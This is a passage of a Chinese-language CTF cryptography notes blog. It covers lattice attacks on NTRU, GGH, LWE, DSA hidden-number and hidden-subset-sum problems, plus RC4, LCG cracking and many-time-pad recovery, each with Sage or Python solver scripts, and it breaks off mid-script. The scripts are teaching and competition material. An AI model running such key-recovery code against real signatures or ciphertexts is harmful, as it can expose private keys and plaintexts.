表示为多项式或向量形式，$F=\\sum\\limits_{i=0}^{N-1}F_ix^i=[F_0,F_1,\\cdots,F_{N-1}]$。 在这里记 $L(d_1,d_2)=\\{F \\in \\mathbb{R}:F$ 有 $d_1$ 个系数为 $1$，$d_2$ 个系数为 $-1$，其余为 $0\\}$，选取三个确定的整数 $d_f,d_g,d_{\\varphi}$，多项式集合 $L_f=L(d_f,d_{f-1}),L_g=L(d_g,d_g),L_{\\varphi}=L(d_{\\varphi},d_{\\varphi})$，而 $L_m=\\{m \\in \\mathbb{R}:m$ 的系数位于区间 $[-\\cfrac{p-1}{2},\\cfrac{p-1}{2}]$，其中 $p$ 为素数 $\\}$。 密钥生成 B随机选择两个多项式 $f$ 和 $g$，$f\\in L_f,g\\in L_g$，要求 $f$ 关于模 $p$ 和模 $q$ 的逆 $F_p,F_q$ 都存在，也即 $F_q \\star f \\equiv 1 \\pmod q$ 和 $F_p \\star f \\equiv 1 \\pmod p$，这里可以用扩展欧几里得算法计算出 $F_p$ 和 $F_q$。为此， $f$ 首先应满足 $\\gcd(f(1),pq)=1$，如果有一个逆不存在，需重新选择 $f$。 然后，B计算 $h \\equiv F_q \\star g \\pmod q$，则公钥为 $h$，私钥为 $f$，但在实际中，还将存储 $F_p$，因而一般认为私钥为 $(f,F_p)$。 加密 假设A想发送信息 $m \\in L_m$ 给B，他将根据参数 $d_{\\varphi}$ 随机选择一个 $\\varphi \\in L_{\\varphi}$，然后，他利用B的公钥 $h$ 计算 $e \\equiv \\varphi \\star h+m \\pmod q$ A把密文 $e$ 发送给B。 解密 当B收到密文 $e$ 后，他首先利用私钥 $f$ 计算 $a \\equiv f \\star e \\pmod q$ 选择 $a$ 的系数位于 $[-\\cfrac{p-1}{2},\\cfrac{p-1}{2}]$ 之间，然后计算 $b \\equiv a \\pmod p$ $c \\equiv F_p \\star b \\pmod p$ 则多项式 $c$ 就是明文 $m$。 构造矩阵 $B^{NT}= \\left(\\begin {array}{c} I &amp; H \\newline 0 &amp; q \\end{array} \\right) =\\left(\\begin {array}{cccc|cccc} \\lambda &amp; 0 &amp; \\cdots &amp; 0 &amp; h_0 &amp; h_1 &amp; \\cdots &amp; h_{N-1} \\newline 0 &amp; \\lambda &amp; \\cdots &amp; 0 &amp; h_{N-1} &amp; h_0 &amp; \\cdots &amp; h_{N-2}\\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; h_1 &amp; h_2 &amp; \\cdots &amp; h_0 \\newline \\hline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; q &amp; 0 &amp; \\cdots &amp; 0 \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; q &amp; \\cdots &amp; 0 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; q\\end{array} \\right) $ 其中 $H$ 是根据公钥多项式的系数生成的循环矩阵。 构建一个这样的矩阵，然后进行LLL算法得到解密密钥。 参考 从一道CTF题初探NTRU格密码 Practical lattice-based cryptography: NTRUEncrypt and NTRUSign 1234567891011121314#Sageh = p = c = v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g = m.LLL()[0]print(f, g)a = f*c % p % gm = a * inverse_mod(f, g) % gprint(bytes.fromhex(hex(m)[2:])) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#Sage #多项式N =p =q =Q.&lt;x&gt; = Zmod(q)[]P.&lt;y&gt; = Zmod(p)[]ex = hx = print(&#x27;-------decrypt------&#x27;)qq = x^N-1pp = y^N-1hn = [int(x) for x in hx.coefficients()]n = len(hn)A1 = matrix.identity(n)A0 = matrix.zero(n)Aq = matrix.identity(n) * qAh = matrix(ZZ, [hn[-i:] + hn[:-i] for i in range(n)])M = block_matrix([A1,Ah,A0,Aq],nrows=2)L = M.LLL()v = L[0]f = list(v)[:n]g = list(v)[n:]fx = Q(f)fy = P(f)gx = Q(g)Fqx = fx.inverse_mod(qq)Fpy = fy.inverse_mod(pp)#hxx = (Fqx*gx).mod(x^N-1)#print(hxx==hx)ax = (fx*ex).mod(qq)an = [int(x) for x in ax.coefficients()]#中心提升(centerlift)，使域范围从[0,q)变换到(-q/2,q/2)for i in range(len(an)): if an[i] &gt; q//2: an[i] -= qax = P(an)print(ax)out = (Fpy * ax).mod(pp)print(out)print(bytes(out.coefficients())) ​ GGH加密1997年，Goldreich、Goldwasser、Halevi三人受Ajtai在格难题上的研究所启发，提出了一个基于格中最近向量难题的非对称密码学算法：GGH Cryptosystem。 1999年，Nguyen发现在这个密码学算法设计中，有一个很大的缺陷，可以使攻击者从密文中获取到明文的部分信息，且可以将原来的最近向量难题转化为一个较为简单的最近向量难题。基于这个观察，Nguyen解出了设计者放在网上的5个challenge中的4个（其中有2个被设计者认为是不可能攻破的），足以证明该密码算法是broken的。 定义 GGH包含一个私钥和一个公钥，选取格 $L$ 的一组好基 $B$ 和一个幺模矩阵 $U$ 作为私钥，计算 $L$ 的另一组基 $B’=UB$ 作为公钥。 选定 $M$ 值，明文向量 $(m_1,m_2,\\cdots,m_n), \\quad m_i \\in(-M,M)$。 加密 给定明文 $m=(m_1,m_2,\\cdots,m_n)$，误差向量 $e$，和公钥 $B’$，计算 $v=m \\cdot B’=\\displaystyle\\sum m_ib_i’$； 密文 $c=v+e=m \\cdot B’+e$。 解密 计算 $c \\cdot B^{-1}=(m \\cdot B’+e)B^{-1}=m \\cdot U \\cdot B \\cdot B^{-1}+e \\cdot B^{-1}=m \\cdot U+e \\cdot B^{-1}$； 如果 $e \\cdot B^{-1}$ 足够小，可利用Babai最近平面算法的变种Babai rounding technique去除； 最后计算 $m=m \\cdot U \\cdot U^{-1} $ 得到明文。 GGH中的误差向量的选取是3或者-3。 求解 利用Nguyen’s Attack算法。 123456789101112131415161718192021222324252627# Sage # Read ciphertext and public key.c = []c = vector(ZZ, c)B = []B = matrix(ZZ, B)# Nguyen&#x27;s Attack.n = 150delta = 3s = vector(ZZ, [delta]*n)B6 = B.change_ring(Zmod(2*delta))left = (c + s).change_ring(Zmod(2*delta))m6 = (B6.solve_left(left)).change_ring(ZZ)new_c = (c - m6*B) * 2 / (2*delta)# embedded techniquenew_B = (B*2).stack(new_c).augment(vector(ZZ, [0]*n + [1]))new_B = new_B.change_ring(ZZ)new_B_BKZ = new_B.BKZ()shortest_vector = new_B_BKZ[0]mbar = (B*2).solve_left(new_c - shortest_vector[:-1])m = mbar * (2*delta) + m6print(bytes.fromhex(hex(m)[2:])) 12345678910111213# Sage# e=mW+rfrom sage.modules.free_module_integer import IntegerLatticeW = e = B = W.stack(e).augment(vector([0] * W.ncols() + [1]))r = IntegerLattice(B).shortest_vector()print(&#x27;r = &#123;&#125;&#x27;.format(r))m = W.solve_left(e - r[:-1])print(&#x27;m = &#123;&#125;&#x27;.format(m)) 参考 GGH encryption scheme GYCTF 2020 - GGH ​ LWE问题容错学习问题 （LWE问题， Learning With Errors）是一个机器学习领域中的怀疑难解问题，由Oded Regev 在2005年提出，他因此赢得2018年哥德尔奖。这是一个极性学习问题的一般形式。 定义 随机选取一个矩阵 $\\mathbf{A} \\in \\mathbb{Z}_q^{m \\times n}$，一个随机向量 $\\mathbf{s} \\in \\mathbb{Z}_q^n$，和一个随机的噪音 $\\mathbf{e} \\in \\varepsilon^m$。 一个LWE系统的输出 $g_\\mathbf{A}(\\mathbf{s, e}) = \\mathbf{As + e} \\pmod q$。 一个LWE问题是，给定一个矩阵 $\\mathbf{A}$，和LWE系统的输出 $g_\\mathbf{A}(\\mathbf{s, e})$，还原 $\\mathbf{s}$。 LWE的误差向量是一个满足正态分布的小向量。 因为加入了一些误差，如果使用高斯消元法的话，这些误差会聚集起来，使得解出来的东西跟实际值差很多。 求解 构造矩阵： $L = \\begin{bmatrix} I &amp; A \\newline 0 &amp; b \\end{bmatrix}$ 利用LLL算法和Babai最近平面算法，可以在多项式时间内找到SVP近似解。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#脚本1-小规模#Sagefrom sage.modules.free_module_integer import IntegerLatticerow = column = prime = ma = res = W = matrix(ZZ, ma)cc = vector(ZZ, res)# Babai&#x27;s Nearest Plane algorithmdef Babai_closest_vector(M, G, target): small = target for _ in range(5): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - smallA1 = matrix.identity(column)Ap = matrix.identity(row) * primeB = block_matrix([[Ap], [W]]) lattice = IntegerLattice(B, lll_reduce=True)print(&quot;LLL done&quot;)gram = lattice.reduced_basis.gram_schmidt()[0]target = vector(ZZ, res)re = Babai_closest_vector(lattice.reduced_basis, gram, target)print(&quot;Closest Vector: &#123;&#125;&quot;.format(re))R = IntegerModRing(prime)M = Matrix(R, ma)M = M.transpose()ingredients = M.solve_right(re)print(&quot;Ingredients: &#123;&#125;&quot;.format(ingredients))m = &#x27;&#x27;for i in range(len(ingredients)): m += chr(ingredients[i])print(m) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#脚本2-大规模#Sagefrom sage.modules.free_module_integer import IntegerLatticefrom random import randintimport sysfrom itertools import starmapfrom operator import mul# Babai&#x27;s Nearest Plane algorithm# from: http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/def Babai_closest_vector(M, G, target): small = target for _ in range(1): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - smallm = n = q = A_values = b_values = A = matrix(ZZ, m + n, m)for i in range(m): A[i, i] = qfor x in range(m): for y in range(n): A[m + y, x] = A_values[x][y]lattice = IntegerLattice(A, lll_reduce=True)print(&quot;LLL done&quot;)gram = lattice.reduced_basis.gram_schmidt()[0]target = vector(ZZ, b_values)res = Babai_closest_vector(lattice.reduced_basis, gram, target)print(&quot;Closest Vector: &#123;&#125;&quot;.format(res))R = IntegerModRing(q)M = Matrix(R, A_values)ingredients = M.solve_right(res)print(&quot;Ingredients: &#123;&#125;&quot;.format(ingredients))for row, b in zip(A_values, b_values): effect = sum(starmap(mul, zip(map(int, ingredients), row))) % q assert(abs(b - effect) &lt; 2 ** 37)print(&quot;ok&quot;) 利用Embedding Technique构造一个Embedding Lattice，也可以解SVP。 1234567891011121314151617181920212223242526272829303132333435363738394041# SageDEBUG = Falsem = 44n = 55p = 2^5q = 2^10def errorV(): return vector(ZZ, [1 - randrange(3) for _ in range(n)])def vecM(): return vector(ZZ, [p//2 - randrange(p) for _ in range(m)])def vecN(): return vector(ZZ, [p//2 - randrange(p) for _ in range(n)])def matrixMn(): mt = matrix(ZZ, [[q//2 - randrange(q) for _ in range(n)] for _ in range(m)]) return mtA = matrixMn()e = errorV()x = vecM()b = x*A+eif DEBUG: print(&#x27;A = \\n%s&#x27; % A) print(&#x27;x = %s&#x27; % x) print(&#x27;b = %s&#x27; % b)print(&#x27;e = %s&#x27; % e)z = matrix(ZZ, [0 for _ in range(m)]).transpose()beta = matrix(ZZ, [1])T = block_matrix([[A, z], [matrix(b), beta]])if DEBUG: print(&#x27;T = \\n%s&#x27; % T)print(&#x27;-----&#x27;)L = T.LLL()print(L[0])print(L[0][:n] == e) 参考 初探全同态加密之二：格密码学与LWE问题 祥云杯 2020 - easy matrix Aero CTF 2020 - Magic II XNUCA2020 - diamond 2022 DASCTF 7月赋能赛 - LWE? ​ 隐藏数问题（HNP / Hidden Number Problem）由DSA签名中各参数的关系： $r \\equiv g^k \\pmod q$ $s \\equiv k^{-1}(H(m)+xr) \\equiv q$ 可得每轮临时密钥与签名、明文的关系： $k_i \\equiv s_i^{-1}r_i \\cdot x+s_i^{-1}H(m) \\pmod q$ $k_i \\equiv A_ix+B_i \\pmod q$ $k_i = A_ix+B_i+l_iq$ 其中 $k_i$ 就是每次使用的临时密钥，$A_i = s_i^{-1}r,B_i = s_i^{-1}H(m)$。 构建格： $M =\\begin{bmatrix}q &amp; &amp; &amp; &amp; &amp; &amp; \\newline&amp; q &amp; &amp; &amp; &amp; &amp; \\newline&amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline&amp; &amp; &amp; q &amp; &amp; &amp; \\newlineA_1&amp;A_2&amp;\\dots &amp; A_t&amp;K/q&amp; &amp; \\newlineB_1&amp;B_2&amp;\\dots &amp; B_t&amp; &amp; K &amp; \\newline\\end{bmatrix}$ （其中 $K$ 是 $k$ 的上界，例如 $k$ 的位数小于等于121时，那么 $K=2^{122}$） 不难发现，存在一个 $M$ 的整系数线性组合 $v$，可以得到我们想要的 $v_k$。 $vM =\\begin{bmatrix}l_1 &amp; l_2 &amp; \\cdots &amp; l_t &amp; x &amp; 1\\end{bmatrix}\\begin{bmatrix}q &amp; &amp; &amp; &amp; &amp; &amp; \\newline&amp; q &amp; &amp; &amp; &amp; &amp; \\newline&amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline&amp; &amp; &amp; q &amp; &amp; &amp; \\newlineA_1&amp;A_2&amp;\\dots &amp; A_t&amp;K/q&amp; &amp; \\newlineB_1&amp;B_2&amp;\\dots &amp; B_t&amp; &amp; K &amp; \\newline\\end{bmatrix} = \\begin{bmatrix}k_1 &amp;k_2 &amp;\\cdots &amp;k_t &amp;Kx/q &amp;K\\end{bmatrix}= v_k$ 因此 $v_k$ 即为 $M$ 上的一个格点，且长度很短，可以用LLL算法求出。 注：有另一个短向量 $v=(0,0,⋯,K,0)$ 也在格上，且这个短向量比 $(k_1, k_2, \\cdots, k_t, Kx/n, K)$ 还要短。此外，多次测试发现，$v_k$ 总会出现在LLL后的第二行。 1234567891011121314151617181920212223242526272829303132import jsont = 40# Load dataf = open(&quot;data&quot;, &quot;r&quot;)(q, Hm_s, r_s, s_s) = json.load(f)# Calculate A &amp; BA = []B = []for r, s, Hm in zip(r_s, s_s, Hm_s): A.append( ZZ( (inverse_mod(s, q)*r) % q ) ) B.append( ZZ( (inverse_mod(s, q)*Hm) % q ) )# Construct LatticeK = 2^122 # ki &lt; 2^122X = q * identity_matrix(QQ, t) # t * tZ = matrix(QQ, [0] * t + [K/q] + [0]).transpose() # t+1 columnZ2 = matrix(QQ, [0] * (t+1) + [K]).transpose() # t+2 columnY = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) # (t+2) * tY = block_matrix([[Y, Z, Z2]])# Find short vectorY = Y.LLL()# checkk0 = ZZ(Y[1, 0] % q)x = ZZ(Y[1, -2] / (K/q) % q)assert(k0 == (A[0]*x + B[0]) % q)print(x) 参考 The Dark Side of the Hidden Number Problem: Lattice Attacks on DSA [HNP] 一类基于各种DSA的HNP问题求解 NPUCTF 2020 - babyLCG RCTF 2022 - IS_THIS_LCG ​ 隐子集和问题（HSSP / Hidden Subset Sum Problem）$w=vG$，其中 $w,v$ 为 $\\text{GF}(p)$ 上的向量，$G$ 为01矩阵（$g_{ij} \\in \\{ 0,1 \\}$），已知 $w$，恢复矩阵 $G$。 求解算法 Nguyen-Stern Algorithm，使用 orthogonal lattice 实现。 参考： A Polynomial-Time Algorithm for Solving the Hidden Subset Sum Problem AIS3 EOF CTF Quals 2021 - notPRNG Zer0pts CTF 2022 - Karen solving_hssp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125from Crypto.Util.number import *n = 60m = 330p = ...w = ...MM = ...e = 0x10001MM = matrix(GF(2), MM)def allpmones(v): return len([vj for vj in v if vj in [-1, 0, 1]]) == len(v)# We generate the lattice of vectors orthogonal to b modulo x0def orthoLattice(b, x0): m = b.length() M = Matrix(ZZ, m, m) for i in range(1, m): M[i, i] = 1 M[1:m, 0] = -b[1:m] * inverse_mod(b[0], x0) M[0, 0] = x0 for i in range(1, m): M[i, 0] = mod(M[i, 0], x0) return Mdef allones(v): if len([vj for vj in v if vj in [0, 1]]) == len(v): return v if len([vj for vj in v if vj in [0, -1]]) == len(v): return -v return Nonedef recoverBinary(M5): lv = [allones(vi) for vi in M5 if allones(vi)] n = M5.nrows() for v in lv: for i in range(n): nv = allones(M5[i] - v) if nv and nv not in lv: lv.append(nv) nv = allones(M5[i] + v) if nv and nv not in lv: lv.append(nv) return Matrix(lv)def kernelLLL(M): n = M.nrows() m = M.ncols() if m &lt; 2 * n: return M.right_kernel().matrix() K = 2 ^ (m // 2) * M.height() MB = Matrix(ZZ, m + n, m) MB[:n] = K * M MB[n:] = identity_matrix(m) MB2 = MB.T.LLL().T assert MB2[:n, : m - n] == 0 Ke = MB2[n:, : m - n].T return Kedef attack(m, n, p, h): # This is the Nguyen-Stern attack, based on BKZ in the second step print(&quot;n =&quot;, n, &quot;m =&quot;, m) iota = 0.035 nx0 = int(2 * iota * n ^ 2 + n * log(n, 2)) print(&quot;nx0 =&quot;, nx0) x0 = p b = vector(h) # only information we get M = orthoLattice(b, x0) t = cputime() M2 = M.LLL() print(&quot;LLL step1: %.1f&quot; % cputime(t)) # assert sum([vi == 0 and 1 or 0 for vi in M2 * X]) == m - n MOrtho = M2[: m - n] print(&quot; log(Height, 2) = &quot;, int(log(MOrtho.height(), 2))) t2 = cputime() ke = kernelLLL(MOrtho) print(&quot; Kernel: %.1f&quot; % cputime(t2)) print(&quot; Total step1: %.1f&quot; % cputime(t)) if n &gt; 170: return beta = 2 tbk = cputime() while beta &lt; n: if beta == 2: M5 = ke.LLL() else: M5 = M5.BKZ(block_size=beta) # we break when we only get vectors with &#123;-1,0,1&#125; components if len([True for v in M5 if allpmones(v)]) == n: break if beta == 2: beta = 10 else: beta += 10 print(&quot;BKZ beta=%d: %.1f&quot; % (beta, cputime(tbk))) t2 = cputime() MB = recoverBinary(M5) print(&quot; Recovery: %.1f&quot; % cputime(t2)) print(&quot; Number of recovered vector = &quot;, MB.nrows()) print(&quot; Number of recovered vector.T = &quot;, MB.ncols()) return MBres = attack(m, n, p, w) ​ 隐线性组合问题（HLCP / Hidden Linear Combination Problem）$w=vG$，其中 $w,v$ 为 $\\text{GF}(p)$ 上的向量，$G$ 为 $0$ 至 $B$ 之间整数值矩阵（$g_{ij} \\in [0,B] \\cap\\mathbb{Z}$），已知 $w$，恢复矩阵 $G$。 参考： Provably Solving the Hidden Subset Sum Problem via Statistical Learning 2022强网杯 - Lattice solving_hssp","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"格密码","slug":"格密码","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"流密码","slug":"crypto-流密码","date":"2020-11-06T16:35:40.000Z","updated":"2022-12-05T14:53:29.357Z","comments":true,"path":"2020/11/07/crypto-流密码/","link":"","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/","excerpt":"","text":"​ 在密码学中，流密码（英语：Stream cipher），又译为流加密、资料流加密，是一种对称加密算法，加密和解密双方使用相同伪随机加密数据流（pseudo-random stream）作为密钥，明文数据每次与密钥数据流顺次对应加密，得到密文数据流。实践中数据通常是一个位（bit）并用异或（xor）操作加密。 伪随机密钥流（keystream）由一个随机的种子（seed）通过算法（称为：PRG，pseudo-random generator）得到，$k$ 作为种子，则 $G(k)$ 作为实际使用的密钥进行加密解密工作。为了保证流加密的安全性，PRG必须是不可预测的。该算法解决了对称加密完善保密性（perfect secrecy）的实际操作困难，由于完善保密性要求密钥长度不短于明文长度，故而实际操作存在困难，改由较短数据流通过特定算法得到密钥流。 RC4在密码学中，RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 由美国密码学家罗纳德·李维斯特（Ronald Rivest）在1987年设计的。由于RC4算法存在弱点，2015年2月所发布的 RFC 7465 规定禁止在TLS中使用RC4加密算法。 RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。 由于异或运算的对合性，RC4加密解密使用同一套算法。 算法 KSA 初始化长度为256的S盒。第一个for循环将0到255的互不重复的元素装入S盒。第二个for循环根据密钥打乱S盒。 12345678for i from 0 to 255 S[i] := iendforj := 0for( i=0 ; i&lt;256 ; i++) j := (j + S[i] + key[i mod keylength]) % 256 swap values of S[i] and S[j]endfor PRGA 下面i,j是两个指针。每收到一个字节，就进行while循环。通过一定的算法（(a),(b)）定位S盒中的一个元素，并与输入字节异或，得到k。循环中还改变了S盒（(c)）。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。 123456789i := 0j := 0while GeneratingOutput: i := (i + 1) mod 256 //a j := (j + S[i]) mod 256 //b swap values of S[i] and S[j] //c k := inputByte ^ S[(S[i] + S[j]) % 256] output Kendwhile 此算法保证每256次循环中S盒的每个元素至少被交换过一次。 12345678910111213141516171819202122232425262728293031323334353637383940414243#python2def KSA(key): keylength = len(key) S = range(256) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] # swap return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 256] yield Kdef RC4(key): S = KSA(key) return PRGA(S)if __name__ == &#x27;__main__&#x27;: key = &#x27;Key&#x27; plaintext = &#x27;Plaintext&#x27; def convert_key(s): return [ord(c) for c in s] key = convert_key(key) keystream = RC4(key) import sys for c in plaintext: sys.stdout.write(&quot;%02X&quot; % (ord(c) ^ keystream.next())) print 123456789101112131415161718192021222324252627#python3N = 256S = [0] * Nkey = &#x27;keykeykey&#x27;Key = [0] * Nt = []for i in range(N): S[i] = i Key[i] = ord(key[i % len(key)])j = 0for i in range(N): j = (j + S[i] + Key[i]) % N S[i], S[j] = S[j], S[i]i = 0j = 0for k in range(len(t)): i = (i + 1) % N j = (j + S[i]) % N S[i], S[j] = S[j], S[i] t[k] ^= S[(S[i] + S[j]) % N]print(t)print(&#x27;&#x27;.join(chr(k) for k in t)) ​ 线性同余生成器 / 线性同余方法（LCG）线性同余方法（LCG）是个产生伪随机数的方法。 它是根据递归公式产生： $ N_{k+1} = (A\\times N_{k}+B){\\pmod {M}} $其中 $A,B,M$ 是产生器设定的常数。 LCG的周期最大为 $M$，但大部分情况都会少于 $M$。要令LCG达到最大周期，应符合以下条件： $B,M$ 互质； $M$ 的所有质因数都能整除 $A-1$； 若 $M$ 是4的倍数，$A-1$ 也是； $A,B,N_{0}$ 都比 $M$ 小； $A,B$ 是正整数。 参考：攻击线性同余生成器(LCG) 123456789101112131415161718192021222324252627282930313233343536373839from functools import reducefrom math import gcdfrom Crypto.Util.number import *def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)# N[i+1] = (A*N[i]+B) % M# A,B,N均未知sequence = []modulus, multiplier, increment = crack_unknown_modulus(sequence)print(&#x27;A = &#x27;+str(multiplier))print(&#x27;B = &#x27;+str(increment))print(&#x27;N = &#x27;+str(modulus)) ​ 多次一密（Many Time Pad Attack）用同一个密钥去加密多条明文，当密文条数较多时就很容易被攻击，例如Many Time Pad。 这个攻击的原理是 $c_1⊕c_2 = m_1⊕m_2$，而通过 $m_1⊕m_2$ 可以分析出 $m_1⊕m_2$，因此 $m_1⊕m_2$ 不再安全。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#脚本1import Crypto.Util.strxor as xoimport libnum, codecs, numpy as npdef isChr(x): if ord(&#x27;a&#x27;) &lt;= x and x &lt;= ord(&#x27;z&#x27;): return True if ord(&#x27;A&#x27;) &lt;= x and x &lt;= ord(&#x27;Z&#x27;): return True return Falsedef infer(index, pos): if msg[index, pos] != 0: return msg[index, pos] = ord(&#x27; &#x27;) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(&#x27; &#x27;)def know(index, pos, ch): msg[index, pos] = ord(ch) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)dat = []def getSpace(): for index, x in enumerate(c): res = [xo.strxor(x, y) for y in c if x!=y] f = lambda pos: len(list(filter(isChr, [s[pos] for s in res]))) cnt = [f(pos) for pos in range(len(x))] for pos in range(len(x)): dat.append((f(pos), index, pos))c = [codecs.decode(x.strip().encode(), &#x27;hex&#x27;) for x in open(&#x27;Problem.txt&#x27;, &#x27;r&#x27;).readlines()]msg = np.zeros([len(c), len(c[0])], dtype=int)getSpace()dat = sorted(dat)[::-1]for w, index, pos in dat: infer(index, pos)know(10, 21, &#x27;y&#x27;)know(8, 14, &#x27;n&#x27;)print(&#x27;\\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))key = xo.strxor(c[0], &#x27;&#x27;.join([chr(c) for c in msg[0]]).encode())print(key) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#脚本2#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1=&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;c2=&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;c3=&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;c4=&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;c5=&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;c6=&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;c7=&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;c8=&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;c9=&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;c10=&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;c11=&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to crack# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher): print &#x27;-------begin-------&#x27; # To store the final key final_key = [None]*150 # To store the positions we know are broken known_key_positions = set() # For each ciphertext for current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don&#x27;t xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150) for index in knownSpaceIndexes: # Store the key&#x27;s value at the correct position final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;) # Record that we known the key at this position known_key_positions.add(index) # Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string) final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key]) # Xor the currently known key with the target cipher output = 